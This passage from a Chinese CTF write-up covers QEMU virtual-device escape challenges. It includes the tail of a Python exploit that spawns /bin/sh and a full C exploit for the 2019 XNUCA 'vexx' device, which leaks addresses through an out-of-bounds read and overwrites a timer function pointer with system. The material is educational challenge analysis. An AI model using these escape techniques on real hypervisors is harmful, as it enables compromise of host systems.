        # 0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20];
        gadget1 = libc_base + 0x14bd1e
        gadget2 = plt_base + 0x3d2f05  # mov rdi, "/bin/sh"; call execv
        print("[+] gadget1:", hex(gadget1))
        print("[+] gadget2:", hex(gadget2))
    
        print("[+] oob to write config_read")
    
        writeb64(user_buf+0x1000+0x460, p64(gadget1))
        writeb64(user_buf+0x1000+0x20, p64(gadget2))
    
        dma_read(0, user_buf+0x1000,(1<<64)-0xe00, 0x1000)
        do_dma()
    
        print("[!] trigger vul:")
        p.sendline("inw 3324")
        p.interactive()
    
    pwn()
    

## 2019 XNUCA vexx

###  漏洞分析

    
    
    void __fastcall pci_vexx_realize(PCIDevice_0 *pdev, Error_0 **errp)
    {
      Object_0 *v2; // rbx
      MemoryRegion_0 *v3; // rax
    
      v2 = object_dynamic_cast_assert(
             &pdev->qdev.parent_obj,
             "vexx",
             "/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c",
             482,
             "pci_vexx_realize");
      pdev->config[61] = 1;
      if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
      {
        timer_init_full(
          (QEMUTimer_0 *)&v2[81].properties,
          0LL,
          QEMU_CLOCK_VIRTUAL,
          1000000,
          0,
          (QEMUTimerCB *)vexx_dma_timer,
          v2);
        qemu_mutex_init((QemuMutex_0 *)&v2[70].ref);
        qemu_cond_init((QemuCond_0 *)&v2[71].parent);
        qemu_thread_create((QemuThread_0 *)&v2[70].properties, "vexx", (void *(*)(void *))vexx_fact_thread, v2, 0);
        memory_region_init_io((MemoryRegion_0 *)&v2[56].parent, v2, &vexx_mmio_ops, v2, "vexx-mmio", 0x1000uLL);
        memory_region_init_io((MemoryRegion_0 *)&v2[62].parent, v2, &vexx_cmb_ops, v2, "vexx-cmb", 0x4000uLL);
        portio_list_init((PortioList_0 *)&v2[68].parent, v2, vexx_port_list, v2, "vexx");
        v3 = pci_address_space_io(pdev);
        portio_list_add((PortioList_0 *)&v2[68].parent, v3, 0x230u);
        pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&v2[56].parent);
        pci_register_bar(pdev, 1, 4u, (MemoryRegion_0 *)&v2[62].parent);
      }
    }
    

可以看到注册了两个`mmio`内存，分别为`vexx-cmb`和`vexx-mmio`。

漏洞点在于`vexx_cmb_write`和`vexx-cmb_read`的越界读写

    
    
    void __fastcall vexx_cmb_write(VexxState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      uint32_t v4; // eax
      hwaddr v5; // rax
    
      v4 = opaque->memorymode;
      if ( (v4 & 1) != 0 )
      {
        if ( addr > 0x100 )
          return;
        LODWORD(addr) = opaque->req.offset + addr;
        goto LABEL_4;
      }
      if ( (v4 & 2) == 0 )
      {
        if ( addr > 0x100 )
          return;
        goto LABEL_4;
      }
      v5 = addr - 0x100;
      LODWORD(addr) = addr - 0x100;
      if ( v5 <= 0x50 )                             // oob
    LABEL_4:
        *(_QWORD *)&opaque->req.req_buf[(unsigned int)addr] = val;// write val
    }
    

可以看到将`val`赋值给`req.req_buf[addr]`，而`addr=opaque->req.offset +
addr`，这里的`offset`和`addr`都由我们指定，所以这里存在越界读写漏洞。

###  漏洞利用

越界读，泄漏地址。越界写，修改函数指针。

###  EXP

    
    
    #include <stdint.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/io.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    
    unsigned char* mmio_mem;
    uint64_t phy_userbuf;
    char *userbuf;
    unsigned char* cmb_mem;
    
    void Err(char* err){
        printf("Error: %s\n", err);
        exit(-1);
    }
    
    void init_mmio(){
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if(mmio_fd < 0){
            Err("Open pci");
        }
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if(mmio_mem<0){
            Err("mmap mmio_mem");
        }
    }
    
    void init_cmb(){
        int fdcmb = open("/sys/devices/pci0000:00/0000:00:04.0/resource1", O_RDWR|O_SYNC);
        if (fdcmb < 0) {
            Err("fdcmb open");
        }
        cmb_mem = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fdcmb, 0);
        if (cmb_mem == MAP_FAILED) {
            Err("cmb");
        }
    }
    
    uint64_t mmio_read(uint64_t addr){
        return *(uint64_t*)(mmio_mem+addr);
    }
    
    void mmio_write(uint64_t addr, uint64_t value){
        *(uint64_t*)(mmio_mem+addr) = value;
    }
    
    void cmb_write(uint64_t addr, uint64_t value){
        *(uint64_t*)(cmb_mem+addr) = value;
    }
    
    uint64_t cmb_read(uint64_t addr){
        return *(uint64_t*)(cmb_mem+addr);
    }
    
    void set_offset(uint64_t val){
        outb(val, 0x240);
    }
    
    void set_mode(uint64_t val){
        outb(val, 0x230);
    }
    
    size_t va2pa(void *addr){
        uint64_t data;
    
        int fd = open("/proc/self/pagemap",O_RDONLY);
        if(!fd){
            perror("open pagemap");
            return 0;
        }
    
        size_t pagesize = getpagesize();
        size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);
    
        if(lseek(fd,offset,SEEK_SET) < 0){
            puts("lseek");
            close(fd);
            return 0;
        }
    
        if(read(fd,&data,8) != 8){
            puts("read");
            close(fd);
            return 0;
        }
    
        if(!(data & (((uint64_t)1 << 63)))){
            puts("page");
            close(fd);
            return 0;
        }
    
        size_t pageframenum = data & ((1ull << 55) - 1);
        size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;
    
        close(fd);
    
        return phyaddr;
    }
    
    void dma_set_cmd(uint64_t val){
        mmio_write(0x98, val);
    }
    
    void dma_set_src(uint64_t src){
        mmio_write(0x80, src);
    }
    
    void dma_set_cnt(uint64_t cnt){
        mmio_write(0x90, cnt);
    }
    
    void dma_set_dst(uint64_t dst){
        mmio_write(0x88, dst);
    }
    
    void dma_write(uint64_t idx, uint64_t cnt){
        dma_set_src(idx);
        dma_set_cnt(cnt);
        dma_set_dst(phy_userbuf);
    
        dma_set_cmd(3);
        sleep(1);
    }
    
    int main(){
        int res = 0;
        printf("init mmio fd:\n");
        init_mmio();
    
        printf("init cmb:\n");
        init_cmb();
    
        userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            Err("mmap userbuf");
        mlock(userbuf, 0x1000);
        phy_userbuf = va2pa(userbuf);
        printf("userbuf va: 0x%llx\n", userbuf);
        printf("userbuf pa: 0x%llx\n", phy_userbuf);
    
        res = ioperm(0x230, 0x30, 1);
        if (res < 0) {
            Err("ioperm");
        }
    
        printf("leak addr:\n");
    
        set_mode(1);
        set_offset(0xf0);
        size_t timer_addr = cmb_read(0x48);
        printf("timer_addr: 0x%lx\n", timer_addr);
    
        size_t system_plt = timer_addr - 0x4dcf10 + 0x2ab860;
        printf("system_plt: 0x%lx\n", system_plt);
    
        size_t sh_addr = timer_addr - 0x4dcf10 + 0x82871C;
        printf("sh_addr: 0x%lx\n", sh_addr);
    
        set_mode(1);
        set_offset(0xf0);
        size_t dev_addr = cmb_read(0x50);
        printf("dev_addr: 0x%lx\n", dev_addr);
        size_t buf_addr = dev_addr+0xce8;
        printf("buf_addr: 0x%lx\n", buf_addr);
    
        set_mode(1);
        set_offset(0xf0);
        size_t cmd1 = 0x20746163;
        size_t cmd2 = 0x6f6f722f;
        cmb_write(0x68, cmd1);
        size_t cmd3 = 0x6c662f74;
        size_t cmd4 = 0x00006761;
        cmb_write(0x6c, cmd2);
        cmb_write(0x70, cmd3);
        cmb_write(0x74, cmd4);
    
        printf("oob write:\n");
        set_mode(1);
        set_offset(0xf0);
        cmb_write(0x48, system_plt);
        cmb_write(0x50, buf_addr);
    
        dma_set_cmd(1);
    
        return 1;
    }
    

## 参考文献

[[QWB2021 Quals] – EzQtest](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/#more)

[qemu-pwn-xnuca-2019-vexx](https://ray-cp.github.io/archivers/qemu-pwn-xnuca-2019-vexx)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Aone** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256977](/post/id/256977)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t010b42f3d8958ad2d2.png) Aone

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

